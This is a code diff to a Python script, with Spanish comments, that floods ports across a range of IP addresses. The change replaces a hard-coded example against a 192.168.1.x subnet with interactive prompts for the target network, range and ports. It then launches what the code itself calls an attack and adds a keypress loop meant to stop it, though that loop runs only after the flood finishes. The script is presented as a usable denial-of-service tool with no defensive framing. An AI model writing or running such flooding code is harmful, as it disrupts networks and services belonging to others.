@@ -1,5 +1,6 @@
 import socket
 import random
+import msvcrt
 
 def saturar_puerto(ip, puerto):
   """
@@ -35,5 +36,17 @@ def saturar_red(ip_base, rango_ip, puertos):
     for puerto in puertos.split(","):
       saturar_puerto(f"{ip_base}.{ip}", int(puerto))
 
-# Ejemplo de uso
-saturar_red("192.168.1", "1-254", "80,21,443")
+# Solicita datos al usuario
+ip_base = input("Introduzca la dirección IP base de la red: ")
+rango_ip = input("Introduzca el rango de IPs a saturar (por ejemplo, 1-254): ")
+puertos = input("Introduzca los puertos a saturar (por ejemplo, 80,21,443): ")
+
+# Inicia el ataque
+saturar_red(ip_base, rango_ip, puertos)
+
+# Detecta la pulsación de la tecla "G" para detener el ataque
+while True:
+  if msvcrt.kbhit():
+    if msvcrt.getch() == b"g":
+      print("Ataque detenido.")
+      break
